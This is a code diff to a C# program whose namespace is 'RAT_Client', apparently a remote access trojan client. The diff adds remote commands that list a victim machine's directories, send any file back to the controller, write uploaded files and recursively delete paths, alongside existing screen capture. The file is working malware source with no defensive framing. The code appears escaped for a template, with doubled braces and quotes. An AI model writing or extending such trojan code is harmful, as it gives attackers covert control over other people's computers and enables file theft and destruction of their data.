@@ -104,6 +104,22 @@ namespace RAT_Client
                             {{
                                 SendScreen(stream);
                             }}
+                            else if (command.StartsWith(""LIST|""))
+                            {{
+                                SendList(writer, command.Substring(5));
+                            }}
+                            else if (command.StartsWith(""DOWNLOAD|""))
+                            {{
+                                SendFile(stream, writer, command.Substring(9));
+                            }}
+                            else if (command.StartsWith(""UPLOAD|""))
+                            {{
+                                ReceiveFile(stream, writer, command);
+                            }}
+                            else if (command.StartsWith(""DELETE|""))
+                            {{
+                                DeletePath(writer, command.Substring(7));
+                            }}
                         }}
                     }}
                 }}
@@ -155,6 +171,91 @@ namespace RAT_Client
             }}
 
             return bitmap;
+        }}
+
+        private static void SendList(StreamWriter writer, string path)
+        {{
+            try
+            {{
+                var dirs = string.Join("";"", Directory.GetDirectories(path));
+                var files = string.Join("";"", Directory.GetFiles(path));
+                writer.WriteLine($""{{dirs}}|{{files}}"");
+                writer.Flush();
+            }}
+            catch (Exception ex)
+            {{
+                writer.WriteLine($""ERROR:{{ex.Message}}"");
+                writer.Flush();
+            }}
+        }}
+
+        private static void SendFile(NetworkStream stream, StreamWriter writer, string path)
+        {{
+            try
+            {{
+                var buffer = File.ReadAllBytes(path);
+                writer.WriteLine(buffer.Length.ToString());
+                writer.Flush();
+                stream.Write(buffer, 0, buffer.Length);
+            }}
+            catch (Exception ex)
+            {{
+                writer.WriteLine($""ERROR:{{ex.Message}}"");
+                writer.Flush();
+            }}
+        }}
+
+        private static void ReceiveFile(NetworkStream stream, StreamWriter writer, string command)
+        {{
+            try
+            {{
+                var parts = command.Split('|');
+                if (parts.Length != 3 || !int.TryParse(parts[2], out int size))
+                {{
+                    writer.WriteLine(""ERROR:INVALID_UPLOAD_COMMAND"");
+                    writer.Flush();
+                    return;
+                }}
+
+                var buffer = new byte[size];
+                int read = 0;
+                while (read < size)
+                {{
+                    int r = stream.Read(buffer, read, size - read);
+                    if (r <= 0) break;
+                    read += r;
+                }}
+                File.WriteAllBytes(parts[1], buffer);
+                writer.WriteLine(""OK"");
+                writer.Flush();
+            }}
+            catch (Exception ex)
+            {{
+                writer.WriteLine($""ERROR:{{ex.Message}}"");
+                writer.Flush();
+            }}
+        }}
+
+        private static void DeletePath(StreamWriter writer, string path)
+        {{
+            try
+            {{
+                if (File.Exists(path))
+                {{
+                    File.Delete(path);
+                }}
+                else if (Directory.Exists(path))
+                {{
+                    Directory.Delete(path, true);
+                }}
+                writer.WriteLine(""OK"");
+                writer.Flush();
+            }}
+            catch (Exception ex)
+            {{
+                writer.WriteLine($""ERROR:{{ex.Message}}"");
+                writer.Flush();
+            }}
         }}
     }}
 }}
